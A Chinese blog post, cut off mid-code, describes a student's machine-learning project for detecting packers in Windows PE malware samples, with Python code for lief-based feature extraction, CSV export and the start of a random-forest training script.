    <link href="http://ronpa.top/2020/05/23/%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BE%A6%E5%A3%B3%E7%B3%BB%E7%BB%9F/"/>
    <id>http://ronpa.top/2020/05/23/%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BE%A6%E5%A3%B3%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-05-23T20:17:46.000Z</published>
    <updated>2021-01-25T19:19:09.709Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>毕设+作品赛 垃圾比赛还要求提交可执行程序 我觉得是在歧视脚本(扒拉出以前写过的tkinter 和调了一万年的pyinstaller 属实拉胯 库都不导入全)</p></blockquote><a id="more"></a><p>就蹭比赛, 只要把毕设写个GUI框框和转成exe就行了, 但没想到啊. 调试死我了</p><h2 id="模型构建"><a href="#模型构建" class="headerlink" title="模型构建"></a>模型构建</h2><h3 id="extract-特征提取-处理"><a href="#extract-特征提取-处理" class="headerlink" title="extract 特征提取+处理"></a>extract 特征提取+处理</h3><p>提取486个特征, 主要利用<code>lief</code>工具对输入文件进行信息提取: 11个pe特征值 bool值; 前64字节的<code>OEP</code>; 256个字节出现的频率<code>ogram</code>; 150个常见<code>libraries</code>; 代码段与数据段数; 标记为可执行的段; 段平均熵值; 虚拟大小比率. 共486个, 但后期实验筛选了 就选了166个, 其中 <code>OEP</code> 和 <code>ogram</code> 干扰性有点大去掉了. label即是文件夹名称.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> logging <span class="keyword">as</span> log</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">libraries = [<span class="string">"libssp-0"</span>, <span class="string">"kernel32"</span>, <span class="string">"user32"</span>, <span class="string">"advapi32"</span>, <span class="string">"oleaut32"</span>, <span class="string">"shell32"</span>, <span class="string">"ole32"</span>, <span class="string">"gdi32"</span>, <span class="string">"comctl32"</span>,</span><br><span class="line">             <span class="string">"version"</span>, <span class="string">"msvcrt"</span>, <span class="string">"comdlg32"</span>, <span class="string">"shlwapi"</span>, <span class="string">"wininet"</span>, <span class="string">"ws2_32"</span>, <span class="string">"winmm"</span>, <span class="string">"winspool.drv"</span>, <span class="string">"wsock32"</span>,</span><br><span class="line">             <span class="string">"msvbvm60"</span>, <span class="string">"rpcrt4"</span>, <span class="string">"mpr"</span>, <span class="string">"psapi"</span>, <span class="string">"iphlpapi"</span>, <span class="string">"ntdll"</span>, <span class="string">"msimg32"</span>, <span class="string">"mscoree"</span>, <span class="string">"crypt32"</span>, <span class="string">"gdiplus"</span>,</span><br><span class="line">             <span class="string">"userenv"</span>, <span class="string">"crtdll"</span>, <span class="string">"oledlg"</span>, <span class="string">"mfc42"</span>, <span class="string">"urlmon"</span>, <span class="string">"imm32"</span>, <span class="string">"rtl100.bpl"</span>, <span class="string">"netapi32"</span>, <span class="string">"wintrust"</span>,</span><br><span class="line">             <span class="string">"vcl100.bpl"</span>,</span><br><span class="line">             <span class="string">"vcl50.bpl"</span>, <span class="string">"uxtheme"</span>, <span class="string">"setupapi"</span>, <span class="string">"ntoskrnl.pe"</span>, <span class="string">"msi"</span>, <span class="string">"msvcp60"</span>, <span class="string">"lz32"</span>, <span class="string">"winhttp"</span>, <span class="string">"hal"</span>, <span class="string">"core.bpl"</span>,</span><br><span class="line">             <span class="string">"rbrcl1416.bpl"</span>, <span class="string">"dbghelp"</span>, <span class="string">"api-ms-win-crt-runtime-l1-1-0"</span>, <span class="string">"api-ms-win-crt-heap-l1-1-0"</span>,</span><br><span class="line">             <span class="string">"api-ms-win-crt-math-l1-1-0"</span>, <span class="string">"api-ms-win-crt-stdio-l1-1-0"</span>, <span class="string">"api-ms-win-crt-locale-l1-1-0"</span>,</span><br><span class="line">             <span class="string">"oleacc"</span>, <span class="string">"komponentyd17.bpl"</span>, <span class="string">"job.bpl"</span>, <span class="string">"cam.bpl"</span>, <span class="string">"vcruntime140"</span>, <span class="string">"secur32"</span>, <span class="string">"msvcr100"</span>,</span><br><span class="line">             <span class="string">"cxeditorsrs17.bpl"</span>, <span class="string">"rasapi32"</span>, <span class="string">"api-ms-win-crt-string-l1-1-0"</span>, <span class="string">"wtsapi32"</span>, <span class="string">"imagehlp"</span>, <span class="string">"msvcp140"</span>,</span><br><span class="line">             <span class="string">"cnc.bpl"</span>, <span class="string">"indyprotocols190.bpl"</span>, <span class="string">"api-ms-win-crt-convert-l1-1-0"</span>, <span class="string">"msvcr120"</span>, <span class="string">"vcl60.bpl"</span>,</span><br><span class="line">             <span class="string">"rbrcl210.bpl"</span>,</span><br><span class="line">             <span class="string">"rtl170.bpl"</span>, <span class="string">"rbide1416.bpl"</span>, <span class="string">"rtl60.bpl"</span>, <span class="string">"vcl170.bpl"</span>, <span class="string">"wldap32"</span>, <span class="string">"shfolder"</span>, <span class="string">"cxlibraryrs17.bpl"</span>,</span><br><span class="line">             <span class="string">"msvcirt"</span>, <span class="string">"report.bpl"</span>, <span class="string">"rtl190.bpl"</span>, <span class="string">"msvcr90"</span>, <span class="string">"api-ms-win-crt-filesystem-l1-1-0"</span>, <span class="string">"cxeditorsrs16.bpl"</span>,</span><br><span class="line">             <span class="string">"avifil32"</span>, <span class="string">"api-ms-win-crt-time-l1-1-0"</span>, <span class="string">"jli"</span>, <span class="string">"graphic.bpl"</span>, <span class="string">"olepro32"</span>, <span class="string">"rtl160.bpl"</span>, <span class="string">"spmmachine.bpl"</span>,</span><br><span class="line">             <span class="string">"cabinet"</span>, <span class="string">"indycore190.bpl"</span>, <span class="string">"sacom210.bpl"</span>, <span class="string">"rbrtl1416.bpl"</span>, <span class="string">"api-ms-win-crt-utility-l1-1-0"</span>,</span><br><span class="line">             <span class="string">"vcl160.bpl"</span>,</span><br><span class="line">             <span class="string">"api-ms-win-crt-environment-l1-1-0"</span>, <span class="string">"zcomponent170.bpl"</span>, <span class="string">"msvfw32"</span>, <span class="string">"libadm_coreutils6"</span>, <span class="string">"rbsha"</span>,</span><br><span class="line">             <span class="string">"dxpscorers16.bpl"</span>, <span class="string">"msacm32"</span>, <span class="string">"vcl70.bpl"</span>, <span class="string">"applicationmanagement.bpl"</span>, <span class="string">"jobgui.bpl"</span>,</span><br><span class="line">             <span class="string">"indyprotocols170.bpl"</span>,</span><br><span class="line">             <span class="string">"rtl70.bpl"</span>, <span class="string">"cxed210.bpl"</span>, <span class="string">"msvcr80"</span>, <span class="string">"libadm_coretinypy6"</span>, <span class="string">"ucrtbased"</span>, <span class="string">"vcruntime140d"</span>, <span class="string">"msvcp120"</span>,</span><br><span class="line">             <span class="string">"msvcp140d"</span>,</span><br><span class="line">             <span class="string">"dinput8"</span>, <span class="string">"gui.bpl"</span>, <span class="string">"maincontrols.bpl"</span>, <span class="string">"rtl120.bpl"</span>, <span class="string">"jcl170.bpl"</span>, <span class="string">"frx17.bpl"</span>, <span class="string">"fs17.bpl"</span>,</span><br><span class="line">             <span class="string">"vcl190.bpl"</span>, <span class="string">"sdl2"</span>,</span><br><span class="line">             <span class="string">"machine.bpl"</span>, <span class="string">"mfc42u"</span>, <span class="string">"normaliz"</span>, <span class="string">"sdl2_gfx"</span>, <span class="string">"sdl2_ttf"</span>, <span class="string">"sdl2_mixer"</span>, <span class="string">"msvcp80"</span>, <span class="string">"cxgridrs17.bpl"</span>,</span><br><span class="line">             <span class="string">"cxeditorsvcld7.bpl"</span>,</span><br><span class="line">             <span class="string">"libeay32"</span>, <span class="string">"cxlibraryd11.bpl"</span>, <span class="string">"vcl120.bpl"</span>, <span class="string">"gr32_d6.bpl"</span>, <span class="string">"cxlibraryrs16.bpl"</span>, <span class="string">"cxgridrs16.bpl"</span>,</span><br><span class="line">             <span class="string">"vcl40.bpl"</span>,</span><br><span class="line">             <span class="string">"opengl32"</span>, <span class="string">"qt5core"</span>, <span class="string">"qtcore4"</span>, <span class="string">"wdfldr.sys"</span>, <span class="string">"nesting.bpl"</span>, <span class="string">"fltmgr.sys"</span>]</span><br><span class="line"></span><br><span class="line">properties = [<span class="string">'has_configuration'</span>,</span><br><span class="line">              <span class="string">'has_debug'</span>,</span><br><span class="line">              <span class="string">'has_exceptions'</span>,</span><br><span class="line">              <span class="string">'has_exports'</span>,</span><br><span class="line">              <span class="string">'has_imports'</span>,</span><br><span class="line">              <span class="string">'has_nx'</span>,</span><br><span class="line">              <span class="string">'has_relocations'</span>,</span><br><span class="line">              <span class="string">'has_resources'</span>,</span><br><span class="line">              <span class="string">'has_rich_header'</span>,</span><br><span class="line">              <span class="string">'has_signature'</span>,</span><br><span class="line">              <span class="string">'has_tls'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attribute_names</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> properties, libraries</span><br><span class="line">    <span class="keyword">return</span> properties + \</span><br><span class="line">           [<span class="string">"entrypoint%d"</span> % i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">64</span>)] + \</span><br><span class="line">           [<span class="string">"byte(%02x)"</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>)] + \</span><br><span class="line">           [<span class="string">"import(%s)"</span> % l <span class="keyword">for</span> l <span class="keyword">in</span> libraries] + \</span><br><span class="line">           [<span class="string">"vsize_ratio"</span>, <span class="string">"code_sections_ratio"</span>, <span class="string">"pec_sections_ratio"</span>, <span class="string">"sections_avg_entropy"</span>,</span><br><span class="line">            <span class="string">"sections_vsize_avg_ratio"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 11个pe特征值 bool值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_properties</span><span class="params">(pe)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> properties</span><br><span class="line">    props = np.array([<span class="number">0.0</span>] * len(properties))</span><br><span class="line">    <span class="keyword">for</span> idx, prop <span class="keyword">in</span> enumerate(properties):</span><br><span class="line">        props[idx] = <span class="number">1.0</span> <span class="keyword">if</span> getattr(pe, prop) <span class="keyword">else</span> <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">return</span> props</span><br><span class="line"></span><br><span class="line"><span class="comment"># 前64字节数据处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_entrypoint</span><span class="params">(ep)</span>:</span></span><br><span class="line">    <span class="comment"># pad</span></span><br><span class="line">    <span class="keyword">while</span> len(ep) &lt; <span class="number">64</span>:</span><br><span class="line">        ep += [<span class="number">0.0</span>]</span><br><span class="line">    <span class="keyword">return</span> np.array(ep) / <span class="number">255.0</span>  <span class="comment"># normalize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 二进制文件中的ASCII表中每个字节重复次数的直方图 64*4=256  0x00-0xff</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_histogram</span><span class="params">(raw)</span>:</span></span><br><span class="line">    histo = np.bincount(np.frombuffer(raw, dtype=np.uint8), minlength=<span class="number">256</span>)</span><br><span class="line">    histo = histo / histo.sum()  <span class="comment"># normalize</span></span><br><span class="line">    <span class="keyword">return</span> histo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># API 导入表内的库 150个</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_libraries</span><span class="params">(pe)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libraries</span><br><span class="line"></span><br><span class="line">    imports = &#123;dll.name.lower(): [api.name <span class="keyword">if</span> <span class="keyword">not</span> api.is_ordinal <span class="keyword">else</span> api.iat_address \</span><br><span class="line">                                  <span class="keyword">for</span> api <span class="keyword">in</span> dll.entries] <span class="keyword">for</span> dll <span class="keyword">in</span> pe.imports&#125;</span><br><span class="line"></span><br><span class="line">    libs = np.array([<span class="number">0.0</span>] * len(libraries))</span><br><span class="line">    <span class="keyword">for</span> idx, lib <span class="keyword">in</span> enumerate(libraries):</span><br><span class="line">        calls = <span class="number">0</span></span><br><span class="line">        dll = <span class="string">"%s.dll"</span> % lib</span><br><span class="line">        <span class="keyword">if</span> lib <span class="keyword">in</span> imports:</span><br><span class="line">            calls = len(imports[lib])</span><br><span class="line">        <span class="keyword">elif</span> dll <span class="keyword">in</span> imports:</span><br><span class="line">            calls = len(imports[dll])</span><br><span class="line">        libs[idx] += calls</span><br><span class="line">    tot = libs.sum()</span><br><span class="line">    <span class="keyword">return</span> (libs / tot) <span class="keyword">if</span> tot &gt; <span class="number">0</span> <span class="keyword">else</span> libs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 包含代码的段的数量与包含数据的段的数量，标记为可执行的段，每个段的平均熵值，大小与其虚拟大小的平均比率, 区段数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_sections</span><span class="params">(pe)</span>:</span></span><br><span class="line">    sections = [&#123; \</span><br><span class="line">                    <span class="string">'characteristics'</span>: <span class="string">','</span>.join(map(str, s.characteristics_lists)),</span><br><span class="line">                    <span class="string">'entropy'</span>: s.entropy,</span><br><span class="line">                    <span class="string">'name'</span>: s.name,</span><br><span class="line">                    <span class="string">'size'</span>: s.size,</span><br><span class="line">                    <span class="string">'vsize'</span>: s.virtual_size&#125; <span class="keyword">for</span> s <span class="keyword">in</span> pe.sections]</span><br><span class="line"></span><br><span class="line">    num_sections = len(sections)</span><br><span class="line">    max_entropy = max([s[<span class="string">'entropy'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) <span class="keyword">if</span> num_sections <span class="keyword">else</span> <span class="number">0.0</span></span><br><span class="line">    max_size = max([s[<span class="string">'size'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) <span class="keyword">if</span> num_sections <span class="keyword">else</span> <span class="number">0.0</span></span><br><span class="line">    min_vsize = min([s[<span class="string">'vsize'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) <span class="keyword">if</span> num_sections <span class="keyword">else</span> <span class="number">0.0</span></span><br><span class="line">    norm_size = (max_size / min_vsize) <span class="keyword">if</span> min_vsize &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [ \</span><br><span class="line">        <span class="comment"># code_sections_ratio</span></span><br><span class="line">        (len([s <span class="keyword">for</span> s <span class="keyword">in</span> sections <span class="keyword">if</span></span><br><span class="line">              <span class="string">'SECTION_CHARACTERISTICS.CNT_CODE'</span> <span class="keyword">in</span> s[<span class="string">'characteristics'</span>]]) / num_sections) <span class="keyword">if</span> num_sections <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">        <span class="comment"># pec_sections_ratio    lief.PE.SECTION_CHARACTERISTICS.MEM_EXECUTE 可执行节的个数</span></span><br><span class="line">        (len([s <span class="keyword">for</span> s <span class="keyword">in</span> sections <span class="keyword">if</span></span><br><span class="line">              <span class="string">'SECTION_CHARACTERISTICS.MEM_EXECUTE'</span> <span class="keyword">in</span> s[<span class="string">'characteristics'</span>]]) / num_sections) <span class="keyword">if</span> num_sections <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">        <span class="comment"># sections_avg_entropy  节的平均熵</span></span><br><span class="line">        ((sum([s[<span class="string">'entropy'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) / num_sections) / max_entropy) <span class="keyword">if</span> max_entropy &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0.0</span>,</span><br><span class="line">        <span class="comment"># sections_vsize_avg_ratio</span></span><br><span class="line">        ((sum([s[<span class="string">'size'</span>] / s[<span class="string">'vsize'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) / num_sections) / norm_size) <span class="keyword">if</span> norm_size &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0.0</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取PE文件特征到一个vector</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_pe</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    print(<span class="string">"encoding"</span>, filepath)</span><br><span class="line">    <span class="keyword">if</span> hasattr(filepath, <span class="string">'read'</span>):</span><br><span class="line">        raw = filepath.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filepath, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            raw = fp.read()</span><br><span class="line"></span><br><span class="line">    sz = len(raw) <span class="comment">#读取文件大小</span></span><br><span class="line">    pe = lief.PE.parse(list(raw))   <span class="comment">#lief工具</span></span><br><span class="line">    ep_bytes = [<span class="number">0</span>] * <span class="number">64</span> <span class="comment">#存前64字节</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ep_offset = pe.entrypoint - pe.optional_header.imagebase    <span class="comment">#靠工具计算出入口函数的位置</span></span><br><span class="line">        ep_bytes = [int(b) <span class="keyword">for</span> b <span class="keyword">in</span> raw[ep_offset:ep_offset + <span class="number">64</span>]]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log.warning(<span class="string">"can't get entrypoint bytes from %s: %s"</span>, filepath, e)</span><br><span class="line">    <span class="comment"># 组合成一个list  分别是开头的label, 11个pe特征, 入口函数前64个字节, 256个字节出现的频率, 150个导入表, 代码段与数据段数，标记为可执行的段，段平均熵值，虚拟大小比率</span></span><br><span class="line">    v = np.concatenate([ \</span><br><span class="line">        [os.path.dirname(filepath).split(<span class="string">'/'</span>)[<span class="number">-1</span>]],</span><br><span class="line">        encode_properties(pe),</span><br><span class="line">        encode_entrypoint(ep_bytes),</span><br><span class="line">        encode_histogram(raw),</span><br><span class="line">        encode_libraries(pe),</span><br><span class="line">        [min(sz, pe.virtual_size) / max(sz, pe.virtual_size)],</span><br><span class="line">        encode_sections(pe)</span><br><span class="line">    ])</span><br><span class="line">    <span class="keyword">return</span> v</span><br></pre></td></tr></table></figure><h3 id="write-to-csv-提取出的list写入csv文件"><a href="#write-to-csv-提取出的list写入csv文件" class="headerlink" title="write_to_csv 提取出的list写入csv文件"></a>write_to_csv 提取出的list写入csv文件</h3><p>这里中间加了一行判断,因为<code>Macos</code>会自动产生开头是<code>_</code>的文件,很麻烦.</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line">import os</span><br><span class="line">import csv</span><br><span class="line">import extract</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">t0 = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line"><span class="keyword">lines</span>=[]</span><br><span class="line">file_dir=(<span class="string">"/Volumes/Samsung_T5/malware samples/alldata/Packed/"</span>)</span><br><span class="line"><span class="keyword">for</span> root, dirs, <span class="built_in">files</span> <span class="keyword">in</span> os.walk(file_dir):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">file</span> <span class="keyword">in</span> <span class="built_in">files</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.join(root, <span class="built_in">file</span>).<span class="built_in">split</span>(<span class="string">'/'</span>)[<span class="number">-1</span>:][<span class="number">0</span>][<span class="number">0</span>] != <span class="string">'.'</span>:</span><br><span class="line">            path = os.path.join(root, <span class="built_in">file</span>)</span><br><span class="line">            <span class="keyword">lines</span>.append(extract.encode_pe(path))</span><br><span class="line"></span><br><span class="line"><span class="built_in">files</span>=<span class="built_in">open</span>(<span class="string">'/Volumes/Samsung_T5/malware samples/data/data-2000.csv'</span>,<span class="string">'w'</span>,newline=<span class="string">''</span>)</span><br><span class="line">writer=csv.writer(<span class="built_in">files</span>, lineterminator=<span class="string">'\n'</span>)   <span class="comment">#防止默认输出'\r\n'</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">line</span> <span class="keyword">in</span> <span class="keyword">lines</span>:</span><br><span class="line">    writer.writerow(<span class="built_in">line</span>) <span class="comment">#写入一行</span></span><br><span class="line">extract_time = <span class="built_in">time</span>.<span class="built_in">time</span>() - t0  <span class="comment"># 数据处理时间</span></span><br><span class="line">print(extract_time)</span><br></pre></td></tr></table></figure><h3 id="randomforest-模型训练"><a href="#randomforest-模型训练" class="headerlink" title="randomforest 模型训练"></a>randomforest 模型训练</h3><p>用了<code>sklearn</code>机器学习框架,很简单,设定好参数就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.externals <span class="keyword">import</span> joblib</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> classification_report</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.数据获取</span></span><br><span class="line">dataset=pd.read_csv(<span class="string">'/Volumes/Samsung_T5/malware samples/data/data-2000.csv'</span>,sep = <span class="string">','</span>, header = <span class="literal">None</span>)</span><br><span class="line">dataset.columns = [<span class="string">"type"</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>,<span class="string">"10"</span>,<span class="string">"11"</span>,<span class="string">"12"</span>,<span class="string">"13"</span>,<span class="string">"14"</span>,<span class="string">"15"</span>,<span class="string">"16"</span>,<span class="string">"17"</span>,<span class="string">"18"</span>,<span class="string">"19"</span>,<span class="string">"20"</span>,<span class="string">"21"</span>,<span class="string">"22"</span>,<span class="string">"23"</span>,<span class="string">"24"</span>,<span class="string">"25"</span>,<span class="string">"26"</span>,<span class="string">"27"</span>,<span class="string">"28"</span>,<span class="string">"29"</span>,<span class="string">"30"</span>,<span class="string">"31"</span>,<span class="string">"32"</span>,<span class="string">"33"</span>,<span class="string">"34"</span>,<span class="string">"35"</span>,<span class="string">"36"</span>,<span class="string">"37"</span>,<span class="string">"38"</span>,<span class="string">"39"</span>,<span class="string">"40"</span>,<span class="string">"41"</span>,<span class="string">"42"</span>,<span class="string">"43"</span>,<span class="string">"44"</span>,<span class="string">"45"</span>,<span class="string">"46"</span>,<span class="string">"47"</span>,<span class="string">"48"</span>,<span class="string">"49"</span>,<span class="string">"50"</span>,<span class="string">"51"</span>,<span class="string">"52"</span>,<span class="string">"53"</span>,<span class="string">"54"</span>,<span class="string">"55"</span>,<span class="string">"56"</span>,<span class="string">"57"</span>,<span class="string">"58"</span>,<span class="string">"59"</span>,<span class="string">"60"</span>,<span class="string">"61"</span>,<span class="string">"62"</span>,<span class="string">"63"</span>,<span class="string">"64"</span>,<span class="string">"65"</span>,<span class="string">"66"</span>,<span class="string">"67"</span>,<span class="string">"68"</span>,<span class="string">"69"</span>,<span class="string">"70"</span>,<span class="string">"71"</span>,<span class="string">"72"</span>,<span class="string">"73"</span>,<span class="string">"74"</span>,<span class="string">"75"</span>,<span class="string">"76"</span>,<span class="string">"77"</span>,<span class="string">"78"</span>,<span class="string">"79"</span>,<span class="string">"80"</span>,<span class="string">"81"</span>,<span class="string">"82"</span>,<span class="string">"83"</span>,<span class="string">"84"</span>,<span class="string">"85"</span>,<span class="string">"86"</span>,<span class="string">"87"</span>,<span class="string">"88"</span>,<span class="string">"89"</span>,<span class="string">"90"</span>,<span class="string">"91"</span>,<span class="string">"92"</span>,<span class="string">"93"</span>,<span class="string">"94"</span>,<span class="string">"95"</span>,<span class="string">"96"</span>,<span class="string">"97"</span>,<span class="string">"98"</span>,<span class="string">"99"</span>,<span class="string">"100"</span>,<span class="string">"101"</span>,<span class="string">"102"</span>,<span class="string">"103"</span>,<span class="string">"104"</span>,<span class="string">"105"</span>,<span class="string">"106"</span>,<span class="string">"107"</span>,<span class="string">"108"</span>,<span class="string">"109"</span>,<span class="string">"110"</span>,<span class="string">"111"</span>,<span class="string">"112"</span>,<span class="string">"113"</span>,<span class="string">"114"</span>,<span class="string">"115"</span>,<span class="string">"116"</span>,<span class="string">"117"</span>,<span class="string">"118"</span>,<span class="string">"119"</span>,<span class="string">"120"</span>,<span class="string">"121"</span>,<span class="string">"122"</span>,<span 